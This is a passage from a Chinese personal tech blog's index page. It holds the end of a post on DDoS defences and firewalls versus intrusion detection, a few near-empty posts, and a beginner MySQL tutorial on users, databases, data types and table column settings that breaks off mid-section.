<li>采用流量清洗服务：使用第三方 DDoS 防护服务，如 Cloudflare、AWS Shield、Akamai 等，以帮助检测和过滤攻击流量。</li>
</ul>
</li>
<li><p>传输层攻击：这类攻击主要针对目标系统的传输层协议，例如通过 SYN 洪水攻击（发送大量未完成的 TCP 连接请求）、UDP 洪水攻击来消耗目标系统的连接资源，使其无法处理正常用户的连接请求。</p>
<p>防御措施：</p>
<ul>
<li>配置防火墙规则：限制 SYN 数据包的速率，防止攻击者发送大量未完成的连接请求；限制 UDP 流量，减少恶意流量进入网络。</li>
<li>使用 SYN Cookies：在不需要分配额外资源的情况下，对 SYN 数据包进行验证。</li>
<li>启用连接限制：限制每个 IP 地址可建立的连接数，降低攻击影响。</li>
</ul>
</li>
<li><p>应用层攻击：这类攻击针对目标系统的应用层服务，例如通过 HTTP 洪水攻击（发送大量伪造的 HTTP 请求）来消耗目标系统的计算资源，导致正常用户无法访问。</p>
<p>防御措施：</p>
<ul>
<li>启用 Web 应用防火墙（WAF）：监控和过滤应用层恶意请求。</li>
<li>使用内容分发网络（CDN）：通过分布式服务器缓存和提供网站内容，抵抗应用层攻击。</li>
<li>限制请求速率：对来自单个 IP 地址的请求速率进行限制，防止攻击者发送大量请求。</li>
<li>使用负载均衡：在多个服务器之间分配流量，分散攻击负载。</li>
</ul>
</li>
</ol>
<p>综合防御措施：</p>
<ul>
<li>网络分层和隔离：实施分层和隔离策略，限制攻击者对关键资源的访问。</li>
<li>使用安全配置和补丁：保持系统和软件的安全配置，及时应用安全补丁，以减少潜在的漏洞。</li>
<li>监控和应急计划：持续监控网络流量和系统性能，制定应急计划以应对 DDoS 攻击。</li>
</ul>
<h2 id="防火墙和入侵防御系统"><a href="#防火墙和入侵防御系统" class="headerlink" title="防火墙和入侵防御系统"></a>防火墙和入侵防御系统</h2><p>防火墙主要负责阻止或允许网络流量通过，基于预先定义的规则集来对传入和传出流量进行过滤。防火墙的主要目的是在内部网络和外部网络之间建立安全边界。</p>
<p>入侵检测系统（IDS）则主要用于监控网络流量，以检测潜在的恶意活动。IDS 会根据特征库、异常行为等来识别攻击行为，主要目的是检测潜在的恶意行为，并在检测到时发出警报。</p>
<p>防火墙和 IDS 之间的关键区别在于，防火墙主要用于过滤网络流量，而 IDS 主要用于监控网络流量并检测异常行为。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://songbaoru.github.io/2023/05/06/MyBatis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SBR">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SBR Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SBR Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/06/MyBatis/" class="post-title-link" itemprop="url">MyBatis</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2023-05-06 11:04:46 / Modified: 11:09:08" itemprop="dateCreated datePublished" datetime="2023-05-06T11:04:46+08:00">2023-05-06</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="MyBatis缓存"><a href="#MyBatis缓存" class="headerlink" title="MyBatis缓存"></a>MyBatis缓存</h1><p>MyBatis的缓存分为一级缓存和二级缓存，一级缓存是默认开启的，而且不能关闭</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://songbaoru.github.io/2023/05/06/Kafka/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SBR">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SBR Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SBR Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/06/Kafka/" class="post-title-link" itemprop="url">Kafka</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-05-06 11:03:13" itemprop="dateCreated datePublished" datetime="2023-05-06T11:03:13+08:00">2023-05-06</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://songbaoru.github.io/2023/05/06/Redis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SBR">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SBR Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SBR Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/06/Redis/" class="post-title-link" itemprop="url">Redis</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-05-06 11:03:01" itemprop="dateCreated datePublished" datetime="2023-05-06T11:03:01+08:00">2023-05-06</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://songbaoru.github.io/2023/05/06/MySQL/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SBR">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SBR Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SBR Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/06/MySQL/" class="post-title-link" itemprop="url">MySQL</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-05-06 11:02:46" itemprop="dateCreated datePublished" datetime="2023-05-06T11:02:46+08:00">2023-05-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-05-14 21:28:33" itemprop="dateModified" datetime="2023-05-14T21:28:33+08:00">2023-05-14</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>索引不适用的条件<br>索引列上有函数，不满足最左前缀，使用了不等号，使用了范围查询等等<br>索引的分类<br>B-Tree索引， Hash索引，全文索引，单值索引、唯一索引、复合索引<br>聚簇索引、非聚簇索引等等，</p>
<h1 id="监视器"><a href="#监视器" class="headerlink" title="监视器"></a>监视器</h1><h2 id="打开MySQL监视器"><a href="#打开MySQL监视器" class="headerlink" title="打开MySQL监视器"></a>打开MySQL监视器</h2><p>打开MySQL监视器的命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u 用户名 -p密码</span><br></pre></td></tr></table></figure>

<p>或者使用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u 用户名 -p</span><br></pre></td></tr></table></figure>

<p>然后输入密码即可</p>
<h2 id="查看字符编码"><a href="#查看字符编码" class="headerlink" title="查看字符编码"></a>查看字符编码</h2><p>在监视器中查看MySQL中字符编码等的设置情况的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status</span><br></pre></td></tr></table></figure>

<p>或者使用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;char%&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><p>修改密码的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET PASSWORD FOR root@localhost=PASSWORD(&#x27;新密码&#x27;)</span><br></pre></td></tr></table></figure>

<h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><p>创建用户的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER 新用户名 IDENTIFIED BY ‘密码’</span><br></pre></td></tr></table></figure>

<p>用户名需要按照“用户名@主机名”的方式写</p>
<h2 id="设置用户权限"><a href="#设置用户权限" class="headerlink" title="设置用户权限"></a>设置用户权限</h2><p>设置用户权限的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CRANT 赋予的权限 ON 数据库名.表名 TO 用户名</span><br></pre></td></tr></table></figure>

<p>“赋予的权限”如果是所有权限就设为“ALL”，如果仅允许SELECL和UPDATE就设置为“SELECT,UPDATE”</p>
<p>如果是所有数据库的所有数据表，就设置为“*.*”</p>
<h2 id="退出监视器"><a href="#退出监视器" class="headerlink" title="退出监视器"></a>退出监视器</h2><p>退出监视器的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>或者使用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>

<h1 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h1><p>MySQL的SQL语句后面需要加分号。</p>
<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>创建数据库的命令格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure>

<h2 id="指定使用的数据库"><a href="#指定使用的数据库" class="headerlink" title="指定使用的数据库"></a>指定使用的数据库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 数据库名</span><br></pre></td></tr></table></figure>

<p>use不是SQL语句，所以不需要输入“;”</p>
<p>在使用use选择数据库的状态下也能够操作其他数据库的表，如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM db2.table;</span><br></pre></td></tr></table></figure>

<p>在没有use db2的情况下也可以执行</p>
<h2 id="显示数据库"><a href="#显示数据库" class="headerlink" title="显示数据库"></a>显示数据库</h2><h3 id="显示当前已有的数据库"><a href="#显示当前已有的数据库" class="headerlink" title="显示当前已有的数据库"></a>显示当前已有的数据库</h3><p>显示当前已有的数据库的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASE;</span><br></pre></td></tr></table></figure>

<h3 id="显示当前使用的数据库"><a href="#显示当前使用的数据库" class="headerlink" title="显示当前使用的数据库"></a>显示当前使用的数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATABASE();</span><br></pre></td></tr></table></figure>

<h2 id="显示数据库中的所有表"><a href="#显示数据库中的所有表" class="headerlink" title="显示数据库中的所有表"></a>显示数据库中的所有表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES;</span><br></pre></td></tr></table></figure>

<h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><p>在MySQL中，你可以使用<code>DROP DATABASE</code>语句来删除已经存在的数据库。以下是其基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE database_name;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>database_name</code>是你想要删除的数据库的名称。例如，如果你想删除名为<code>my_database</code>的数据库，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE my_database;</span><br></pre></td></tr></table></figure>

<p>这将删除<code>my_database</code>数据库以及其中的所有表和数据。</p>
<p>请注意，<code>DROP DATABASE</code>语句会永久删除数据库以及其中的所有表和数据，因此在使用之前请确保你真的想要删除该数据库。</p>
<p>类似地，你也可以使用<code>IF EXISTS</code>子句来避免在尝试删除不存在的数据库时出现错误，语法如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> database_name;</span><br></pre></td></tr></table></figure>

<p>如果<code>database_name</code>存在，那么它将被删除。如果它不存在，MySQL将发出一条警告，而不是一个错误，并允许查询继续。这对于自动化脚本或者你不确定数据库是否存在时非常有用，因为它可以防止因尝试删除不存在的数据库而导致的错误。</p>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>数据库表列中的数据的种类成为数据类型</p>
<h2 id="二进制数据类型"><a href="#二进制数据类型" class="headerlink" title="二进制数据类型"></a>二进制数据类型</h2><table>
<thead>
<tr>
<th>数据类型</th>
<th>含义</th>
<th>对应范围</th>
</tr>
</thead>
<tbody><tr>
<td>BLOB</td>
<td>存储二进制大型对象的数据类型</td>
<td>最多可以存储65535个字节</td>
</tr>
</tbody></table>
<h2 id="数值型数据类型"><a href="#数值型数据类型" class="headerlink" title="数值型数据类型"></a>数值型数据类型</h2><table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">含义</th>
<th align="center">对应范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">TINYINT</td>
<td align="center">极小整数值</td>
<td align="center">-128 到 127（有符号），0 到 255（无符号）</td>
</tr>
<tr>
<td align="center">SMALLINT</td>
<td align="center">小整数值</td>
<td align="center">-32768 到 32767（有符号），0 到 65535（无符号）</td>
</tr>
<tr>
<td align="center">MEDIUMINT</td>
<td align="center">中等大小的整数值</td>
<td align="center">-8388608 到 8388607（有符号），0 到 16777215（无符号）</td>
</tr>
<tr>
<td align="center">INT</td>
<td align="center">常规大小的整数值</td>
<td align="center">-2147483648 到 2147483647（有符号），0 到 4294967295（无符号）</td>
</tr>
<tr>
<td align="center">BIGINT</td>
<td align="center">非常大的整数值</td>
<td align="center">-9223372036854775808 到 9223372036854775807（有符号），0 到 18446744073709551615（无符号）</td>
</tr>
<tr>
<td align="center">FLOAT</td>
<td align="center">单精度浮点数</td>
<td align="center">精度大约为 7 位小数</td>
</tr>
<tr>
<td align="center">DOUBLE</td>
<td align="center">双精度浮点数</td>
<td align="center">精度大约为 15 位小数</td>
</tr>
<tr>
<td align="center">DECIMAL</td>
<td align="center">精确的小数值，用于存储精确的数值，如货币</td>
<td align="center">精度可达 65 位，小数部分最多 30 位</td>
</tr>
</tbody></table>
<p>输入的数值型数据可以采用指数表示法输入，在指数表示法输入的情况下，“AE+B”表示“A乘以10的B次方”，例如“6.02*10的23次方”可以表示为“6.02E+23”。</p>
<h2 id="字符串型数据类型"><a href="#字符串型数据类型" class="headerlink" title="字符串型数据类型"></a>字符串型数据类型</h2><table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">含义</th>
<th align="center">对应范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CHAR</td>
<td align="center">定长字符串，长度固定</td>
<td align="center">0 到 255 字节</td>
</tr>
<tr>
<td align="center">VARCHAR</td>
<td align="center">变长字符串，长度可变</td>
<td align="center">0 到 65535 字节</td>
</tr>
<tr>
<td align="center">TINYTEXT</td>
<td align="center">很小的文本字符串</td>
<td align="center">0 到 255 字节</td>
</tr>
<tr>
<td align="center">TEXT</td>
<td align="center">小到中等大小的文本字符串</td>
<td align="center">0 到 65535 字节</td>
</tr>
<tr>
<td align="center">MEDIUMTEXT</td>
<td align="center">中等大小的文本字符串</td>
<td align="center">0 到 16777215 字节</td>
</tr>
<tr>
<td align="center">LONGTEXT</td>
<td align="center">大文本字符串</td>
<td align="center">0 到 4294967295 字节</td>
</tr>
<tr>
<td align="center">ENUM</td>
<td align="center">字符串对象，只能有一组预定义的值，并且值的数量不能超过 65535</td>
<td align="center">1 或 2 字节，根据枚举值的数量</td>
</tr>
<tr>
<td align="center">SET</td>
<td align="center">字符串对象，可以有多个值，值的数量不能超过 64</td>
<td align="center">1、2、3、4 或 8 字节，根据集合值的数量</td>
</tr>
</tbody></table>
<p>输入的字符串如果有“’”，需要转义处理，改为“\‘”</p>
<p>MySQL4.1版本之后，VARCHAR和CHAR的()中指定的位数单位变为“字符”，以VARCHAR(10)为例，不管输入的是中文还是英文还是数字，最多只能保留10个字符</p>
<p><strong>VARCHAR的字符范围：</strong></p>
<p>在MySQL 5.0.3及更高版本中，<code>VARCHAR</code>可以存储最多65535字节的数据，这包括存储长度的1到2个字节。实际的最大字符串长度由最大行大小（默认为65535字节）和使用的字符集决定。</p>
<p>例如，如果使用utf8字符集（最多需要3字节来存储一个字符），则<code>VARCHAR</code>可以存储最多21845个字符（65535&#x2F;3，舍去小数）。如果使用utf8mb4字符集（最多需要4字节来存储一个字符），则<code>VARCHAR</code>可以存储最多16383个字符（65535&#x2F;4，舍去小数）。</p>
<p>在MySQL 5.0.2及更低版本中，<code>VARCHAR</code>可以存储最多255个字符。</p>
<h2 id="日期和时间型数据类型"><a href="#日期和时间型数据类型" class="headerlink" title="日期和时间型数据类型"></a>日期和时间型数据类型</h2><table>
<thead>
<tr>
<th align="center">数据类型</th>
<th align="center">含义</th>
<th align="center">对应范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">YEAR</td>
<td align="center">年份</td>
<td align="center">1901 到 2155（4位时），以及1970<del>2069（2位时，70</del>69）</td>
</tr>
<tr>
<td align="center">DATE</td>
<td align="center">日期</td>
<td align="center">‘1000-01-01’ 到 ‘9999-12-31’</td>
</tr>
<tr>
<td align="center">TIME</td>
<td align="center">时间</td>
<td align="center">‘-838:59:59’ 到 ‘838:59:59’</td>
</tr>
<tr>
<td align="center">DATETIME</td>
<td align="center">日期和时间组合</td>
<td align="center">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>
</tr>
<tr>
<td align="center">TIMESTAMP</td>
<td align="center">时间戳</td>
<td align="center">‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC</td>
</tr>
</tbody></table>
<p>MySQL中的时间类型还支持小数秒，例如 <code>DATETIME(3)</code>、<code>TIME(3)</code> 或 <code>TIMESTAMP(3)</code> 可以存储精确到毫秒的时间。在括号中的数字表示小数秒的精度。</p>
<h1 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h1><h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><p>在MySQL中，你可以使用<code>CREATE TABLE</code>语句来创建一个新的表。在<code>CREATE TABLE</code>语句中，你可以指定表名，列名，列的数据类型以及任何附加的约束。</p>
<p>以下是一个创建新表的基本示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">    column1 datatype <span class="keyword">constraint</span>,</span><br><span class="line">    column2 datatype <span class="keyword">constraint</span>,</span><br><span class="line">    column3 datatype <span class="keyword">constraint</span>,</span><br><span class="line">    ....</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>table_name</code>是你要创建的表的名称，<code>column1</code>、<code>column2</code>和<code>column3</code>是列的名称，<code>datatype</code>是列的数据类型，<code>constraint</code>是任何你想在列上应用的约束。</p>
<p>例如，假设你想创建一个名为<code>students</code>的表，其中有<code>id</code>、<code>name</code>、<code>age</code>和<code>email</code>四个字段。你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> students (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    email <span class="type">VARCHAR</span>(<span class="number">100</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>在这个例子中：</p>
<ul>
<li><code>id</code>是一个整数类型的列，它自动递增并且是表的主键。</li>
<li><code>name</code>和<code>email</code>都是变长字符类型的列，最大长度为100。</li>
<li><code>age</code>是一个整数类型的列。</li>
</ul>
<p>注意，每一行都需要以逗号结束，但是最后一行除外。最后，整个语句需要以分号结束。</p>
<p>数据库名、表名、列名可以使用&#96;&#96;（反引号）括起来</p>
<p>输入到列中字符串的值需要用’’（单引号）或者””（双引号）括起来</p>
<p>创建表时指定字符编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名 (列名1 数据类型1, 列名2 数据库类型2...) CHARSET=utf8;</span><br></pre></td></tr></table></figure>

<h2 id="字段设置"><a href="#字段设置" class="headerlink" title="字段设置"></a>字段设置</h2><h3 id="设置主键"><a href="#设置主键" class="headerlink" title="设置主键"></a>设置主键</h3><p>主键的特点：</p>
<ul>
<li>没有重复的值</li>
<li>不允许输入空值（NULL）</li>
</ul>
<p>命令格式：</p>
<p>在创建表时给主键字段后添加PRIMARY KEY</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名 (列名1 数据类型1 PRIMARY KEY, 列名2 数据库类型2...);</span><br></pre></td></tr></table></figure>

<h3 id="设置唯一键"><a href="#设置唯一键" class="headerlink" title="设置唯一键"></a>设置唯一键</h3><p>唯一键（unique key）的特点</p>
<ul>
<li><p>不允许重复</p>
</li>
<li><p>允许输入NULL</p>
</li>
<li><p>在创建表时定义唯一键：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">  column1 data_type,</span><br><span class="line">  column2 data_type,</span><br><span class="line">  <span class="keyword">UNIQUE</span> (column1)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
<li><p>在已存在的表上添加唯一键：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> (column1);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="设置列可以自动递增"><a href="#设置列可以自动递增" class="headerlink" title="设置列可以自动递增"></a>设置列可以自动递增</h3><p>自动递增（AUTO_INCREMENT）可以应用于任何整数类型的列。<code>AUTO_INCREMENT</code>属性允许数据库自动为新记录生成一个唯一的数字。通常用于主键。</p>
<p>使用<code>AUTO_INCREMENT</code>属性，需要满足以下几个条件：</p>
<ul>
<li>列必须被定义为<code>NOT NULL</code>，因为它必须有值。</li>
<li>列必须被定义为整数类型（例如，<code>INT</code>，<code>SMALLINT</code>，<code>MEDIUMINT</code>，<code>BIGINT</code>）。</li>
<li>每个表只能有一个<code>AUTO_INCREMENT</code>列。</li>
</ul>
<p>示例，将<code>id</code>列定义为<code>AUTO_INCREMENT</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE employees (</span><br><span class="line">    id INT AUTO_INCREMENT,</span><br><span class="line">    name VARCHAR(100),</span><br><span class="line">    PRIMARY KEY(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>MySQL如何设置连续递增字段的初始值：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tablename (</span><br><span class="line">    id <span class="type">INT</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id)</span><br><span class="line">) AUTO_INCREMENT<span class="operator">=</span><span class="number">1000</span>;</span><br></pre></td></tr></table></figure>

<p>如果已经创建了表，并且想改变AUTO_INCREMENT的值，可以使用ALTER TABLE命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tablename AUTO_INCREMENT <span class="operator">=</span> <span class="number">1000</span>;</span><br></pre></td></tr></table></figure>

<p>注意，不能将AUTO_INCREMENT的值设置为比当前最大值小的数，因如果这样做，MySQL将忽略此次设置并保持当前最大值。</p>
<h3 id="设置列的默认值"><a href="#设置列的默认值" class="headerlink" title="设置列的默认值"></a>设置列的默认值</h3><p>在MySQL中，可以在创建表或修改表的时候设置字段的默认值。这个默认值将被用于任何未指定该列值的新行。</p>
<ol>
<li>在创建表的时候设置默认值：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tablename (</span><br><span class="line">    columnname1 <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1</span>,</span><br><span class="line">    columnname2 <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;default_value&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们创建了一个名为”tablename”的表，它有两个字段，”columnname1”和”columnname2”。对于”columnname1”，如果在插入新的行时没有指定它的值，那么它的值将默认为1。对于”columnname2”，如果在插入新的行时没有指定它的值，那么它的值将默认为’default_value’。</p>
<ol start="2">
<li>修改已经存在的表，为字段设置默认值：</li>
</ol>
